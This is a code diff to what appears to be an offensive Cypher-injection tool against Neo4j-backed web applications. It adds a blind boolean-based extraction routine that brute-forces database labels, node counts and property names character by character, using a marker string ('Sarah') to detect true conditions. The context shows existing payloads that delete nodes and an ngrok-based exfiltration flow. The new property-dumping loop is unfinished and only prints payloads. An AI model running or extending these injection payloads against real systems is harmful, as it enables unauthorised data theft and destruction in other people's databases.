@@ -11,6 +11,7 @@ import re
 import sys
 import json
 import os
+import string
 from tabulate import tabulate
 from pyngrok import ngrok
 from packaging import version
@@ -199,12 +200,15 @@ class Neo4jInjector:
         self.proxies = {'http': 'http://127.0.0.1:8080'}
 
     def inject_payload(self, payload):
-        """Inject a crafted payload to the target."""
-        for injection_character in ["1337", "1337'", "1337\"", "1337'})", "1337\"})"]:
+        """Inject a crafted payload to the target and return the response object."""
+        responses = []  # Store responses from all injections
+        for injection_character in ["Sarah'"]:
             full_payload = f"{injection_character}{payload}"
             encoded_payload = quote(full_payload, safe='')
             url, data = self.prepare_request_data(encoded_payload)
-            self.execute_request(url, data)
+            response = self.execute_request(url, data)
+            responses.append(response)
+        return responses
 
     def prepare_request_data(self, encoded_payload):
         """Prepare the URL and data for the request."""
@@ -222,16 +226,17 @@ class Neo4jInjector:
         return url, data
 
     def execute_request(self, url, data=None):
-        """Execute the HTTP request with the prepared data."""
+        """Execute the HTTP request with the prepared data and return the response."""
         try:
             response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, allow_redirects=False) if data else requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
             if response.status_code == 302:
                 print("302 Redirect, Cookies Expired/Invalid ?")
                 sys.exit()
+            return response  # Return the response object
         except requests.exceptions.RequestException as e:
             print(f"Error occurred: {e}")
-
         return None
+
 
     def detect_inject(self):
         print("Determining if the target is injectable")
@@ -409,6 +414,85 @@ class Neo4jInjector:
     def clean_up(self):
         self.inject_payload(" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [1337, '1337']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")
 
+    def blind(self):
+        # Combine ASCII letters, digits, and punctuation
+        valid_chars = string.ascii_letters + string.digits + string.punctuation
+
+        # Dump label count
+        for i in range(1000):
+            responses = self.inject_payload(f" AND COUNT {{CALL db.labels() YIELD label RETURN label}} = {i} and '1'='1")
+            # Check for the word "Sarah" in each response
+            if any("Sarah" in response.text for response in responses):
+                label_count = i
+                # print(f"Label count: {label_count}")
+                break  # Break out of the inner loop if "Sarah" is found
+
+        # Dump size of label
+        label_sizes = []
+        for i in range(label_count):
+            for n in range(1000): 
+                responses = self.inject_payload(f" AND EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(list[{i}]) = {n} RETURN list}}  AND '1' = '1")
+                # Check if any of the responses contain the word "Sarah"
+                if any("Sarah" in response.text for response in responses):
+                    #print(f"Found 'Sarah' in response for label {i}, size {n}")
+                    label_sizes.append(n)
+                    break  # Exit the inner loop once "Sarah" is found
+
+        # Dump label
+        labels = []
+        for i in range(label_count):  
+            label = ''
+            for n in range(label_sizes[i]):
+                for char in valid_chars:
+                    responses = self.inject_payload(f" AND EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(list[{i}], {n}, 1) = '{char}' RETURN list}} AND '1' = '1")
+                    # Check if any of the responses contain the word "Sarah"
+                    if any("Sarah" in response.text for response in responses):
+                        # print(f"Found 'Sarah' in response for label {i}, size {n}, character {char}")
+                        label += char
+                        break  # Exit the inner loop once "Sarah" is found
+            labels.append(label)
+
+        print(f"\n[*] available labels [{label_count}]:")
+        for label in labels:
+            print(f"[+] {label}")
+
+        # Dump node count
+        node_count_list = []
+        for label in labels:
+            for i in range(1000):
+                responses = self.inject_payload(f" AND COUNT {{MATCH(x:{label}) RETURN x}} = {i} AND '1' = '1")
+                # Check for the word "Sarah" in each response
+                if any("Sarah" in response.text for response in responses):
+                    node_count_list.append(i)
+                    break  # Break out of the inner loop if "Sarah" is found
+        # print(node_count_list)
+
+            for i in range(1000):
+                responses = self.inject_payload(f" AND COUNT {{MATCH (x:{label}) UNWIND keys(x) as properties RETURN DISTINCT properties}} = {i} AND '1' = '1")
+                # Check for the word "Sarah" in each response
+                if any("Sarah" in response.text for response in responses):
+                    property_count = i
+                    # print(f"Label count: {label_count}")
+                    break  # Break out of the inner loop if "Sarah" is found
+                
+            print(f"\n[*] Label: {label}")
+            print(f"[+] available properties [{property_count}]:")
+
+
+            for i in range(property_count):
+                for n in range(10):
+                    payload = f" AND EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH COLLECT(DISTINCT(properties)) AS list WHERE SIZE(list[{i}]) = {n} RETURN list}} AND '1' = '1"
+                    print(payload)
+
+            # for pr0perty in properties:
+            #     print(f"[++] {pr0perty}")
+
+            
+
+
+
+
+
 
 
 def main():
@@ -457,10 +541,10 @@ def main():
         print("This version of the program only supports injection detection of API methods")
 
     # Begin exfiltration process
-    
+    injector.blind()
     injector.exfil_data()
-    injector.exfil_relationship()
-    injector.clean_up()
+    # injector.exfil_relationship()
+    # injector.clean_up()
 
     listener.stop_listener()
     listener_thread.join()
